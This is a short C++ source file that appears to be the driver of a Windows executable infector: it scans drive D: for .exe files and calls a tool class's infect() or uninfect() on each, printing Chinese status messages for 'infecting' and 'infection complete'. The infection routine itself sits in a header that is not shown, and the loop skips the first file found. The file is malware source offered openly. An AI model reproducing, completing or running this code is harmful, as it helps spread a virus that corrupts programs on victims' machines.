#include <stdio.h>
#include <stdlib.h>
#include "tool.h"
#include <iostream>


using namespace std;

int main()
{
	long file;
	struct _finddata_t find;
	_chdir("d:\\");
	if((file=_findfirst("*.exe", &find))==-1L)
	{
		printf("无exe文件！\n");
		exit(0);
	}

	while(_findnext(file, &find)==0)
	{
		int flag = tool::isSuitable(find.name);

		if (flag==2)
		{
			printf("感染中......\n");
			tool pe(find.name);
			pe.infect();
			printf("感染完成！\n");
		}
		if (flag == 1)
		{
			printf("解除感染中......\n");
			tool pe(find.name);
			pe.uninfect();
			printf("解除感染完成！\n");
		}
	}
	_findclose(file);

	return 0;
}